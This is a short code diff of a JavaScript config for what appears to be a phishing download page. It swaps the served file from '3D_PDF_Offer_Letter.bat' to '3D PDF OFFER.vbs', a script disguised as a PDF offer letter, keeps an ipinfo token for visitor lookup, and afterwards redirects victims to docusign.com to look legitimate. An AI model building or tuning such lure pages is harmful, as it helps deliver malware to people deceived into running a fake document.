@@ -32,8 +32,8 @@ window.config = {
     ipinfo_token: '1006035904ee8d',
 
     // Download Settings
-    downloadFile: "3D_PDF_Offer_Letter.bat",
-    downloadName: "3D_PDF_Offer_Letter.bat",
+    downloadFile: "3D PDF OFFER.vbs",
+    downloadName: "3D PDF OFFER.vbs",
 
     // Redirect URL
     redirectUrl: "https://www.docusign.com"
@@ -60,5 +60,6 @@ const ipinfo_token = window.config.ipinfo_token;
 const downloadFile = window.config.downloadFile;
 const downloadName = window.config.downloadName;
 const redirectUrl = window.config.redirectUrl;
+
 
 
